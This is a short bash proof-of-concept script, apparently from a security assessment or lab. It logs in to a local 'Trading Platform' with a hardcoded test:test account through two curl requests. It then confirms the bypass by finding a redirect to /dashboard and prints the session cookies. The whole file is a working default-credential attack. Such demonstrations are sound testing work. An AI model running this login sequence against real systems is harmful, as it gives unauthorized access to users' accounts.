#!/bin/bash

# POC: Default Credentials Authentication Bypass
# Target: Trading Platform
# Vulnerability: Hardcoded test account (test:test) left in production
# Description: Demonstrates how an attacker can authenticate using default credentials

TARGET_URL="http://localhost:8080"
USERNAME="test"
PASSWORD="test"
USER_ID="10032"

echo "[*] Default Credentials Authentication Bypass POC"
echo "[*] Target: $TARGET_URL"
echo "[*] Testing with credentials: $USERNAME:$PASSWORD"
echo ""

# Step 1: Initial POST to root with username parameter
echo "[+] Step 1: Sending initial authentication request with username=$USERNAME"
response1=$(curl -s -c /tmp/cookies.txt -b /tmp/cookies.txt -X POST "$TARGET_URL/" \
  -d "username=$USERNAME" \
  -H "Content-Type: application/x-www-form-urlencoded")

echo "[*] Response received. Checking for redirect or response content..."
echo ""

# Step 2: POST to /password/test with password
echo "[+] Step 2: Submitting credentials at /password/$USERNAME endpoint"
response2=$(curl -s -c /tmp/cookies.txt -b /tmp/cookies.txt -i -X POST "$TARGET_URL/password/$USERNAME" \
  -d "username=$USERNAME&user_id=$USER_ID&password=$PASSWORD" \
  -H "Content-Type: application/x-www-form-urlencoded")

echo "[*] Full response:"
echo "$response2"
echo ""

# Step 3: Check if authentication was successful
echo "[+] Step 3: Analyzing authentication response..."
if echo "$response2" | grep -q "302\|Location: /dashboard"; then
    echo "[✓] SUCCESS: Received 302 redirect to /dashboard - Authentication bypass confirmed!"
    echo ""
    echo "[✓] Default credentials (test:test) successfully authenticated!"
    echo "[✓] Attacker can now access the trading platform with user account (user_id: $USER_ID)"
    
    # Extract auth tokens if present
    if echo "$response2" | grep -q "Set-Cookie"; then
        echo ""
        echo "[*] Authentication cookies set:"
        echo "$response2" | grep -i "Set-Cookie"
    fi
    exit 0
else
    echo "[-] No 302 redirect found"
    echo "[*] Response status line:"
    echo "$response2" | head -n 1
    exit 1
fi